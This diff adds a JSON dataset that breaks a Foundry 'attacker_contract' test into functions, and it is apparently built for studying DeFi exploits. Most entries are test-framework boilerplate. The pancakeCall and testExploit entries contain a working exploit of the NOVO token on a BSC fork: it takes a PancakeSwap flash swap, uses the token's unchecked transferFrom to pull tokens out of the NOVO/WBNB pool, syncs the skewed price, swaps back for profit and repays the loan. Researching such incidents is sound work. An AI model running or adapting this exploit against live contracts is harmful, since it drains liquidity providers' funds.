@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // \u653b\u64ca\u8005\u5148\u8cb7\u5165 NOVO Token\n        // \u900f\u904e NOVO Token \u7684 transferFrom \u672a\u904e\u6ffe `from`\n        // `from` \u6307\u5b9a\u70ba NOVO/WBNB \u7684 LP pool, \u5373\u53ef\u64cd\u7e31 PancakeSwap NOVO/WBNB \u7684\u50f9\u683c\n        // \u653b\u64ca\u8005\u518d\u8ce3\u51fa flashswap \u501f\u4f86\u7684 NOVO Token \u5373\u53ef\u7372\u5229\n\n        address[] memory path = new address[](2);\n\n        emit log_named_decimal_uint(\"[*] Attacker flashswap Borrow WBNB\", amount1, 18);\n\n        // Use borrow WBNB to swap some NOVO token\n        emit log_string(\"[*] Attacker going swap some NOVO...\");\n        wbnb.approve(address(PancakeRouter), type(uint256).max);\n        path[0] = address(wbnb);\n        path[1] = address(novo);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            172 * 1e17, 1, path, address(this), block.timestamp\n        ); // get 4,749,070,146,640,911 NOVO Token\n        require(novo.balanceOf(address(this)) != 0, \"Swap Failed\");\n\n        // Sync NOVO token balance before exploit\n        emit log_named_decimal_uint(\"\\t[INFO] Attacker NOVO balance\", novo.balanceOf(address(this)), 9);\n        emit log_named_decimal_uint(\"\\t[INFO] PancakeSwap NOVO/WBNB LP balance\", novo.balanceOf(address(novoLP)), 9);\n\n        // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price\n        emit log_string(\"[E] Attacker going manipulate NOVO/WBNB LP...\");\n        novo.transferFrom(address(novoLP), address(novo), 113_951_614_762_384_370); // 113,951,614.76238437 NOVO Token\n        emit log_named_decimal_uint(\"\\t[INFO] PancakeSwap NOVO/WBNB LP balance\", novo.balanceOf(address(novoLP)), 9);\n\n        // Sync NOVO/WBNB price\n        novoLP.sync();\n\n        // Swap NOVO to WBNB, make attacker profit\n        emit log_string(\"[*] Attacker going swap some WBNB...\");\n        novo.approve(address(PancakePair), novo.balanceOf(address(this)));\n        path[0] = address(novo);\n        path[1] = address(wbnb);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            novo.balanceOf(address(this)), 1, path, address(this), block.timestamp\n        );\n        require(wbnb.balanceOf(address(this)) > 172 * 1e17, \"Exploit Failed\");\n\n        // Payback the flashswap, will be `BorrowAmount` + 0.25% fee\n        require(wbnb.transfer(address(PancakePair), amount1 + 4472 * 10e13), \"Payback Failed\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 18_225_002); //fork bsc at block number 18225002\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        wbnb.deposit{value: 10 * 1e18}();\n        emit log_named_decimal_uint(\"[Start] Attacker WBNB balance before exploit\", wbnb.balanceOf(address(this)), 18);\n\n        // Brrow 17.2 WBNB\n        bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, 172 * 1e17);\n        PancakePair.swap(0, 172 * 1e17, address(this), data);\n\n        emit log_named_decimal_uint(\"[End] After repay, WBNB balance of attacker\", wbnb.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  }
+]
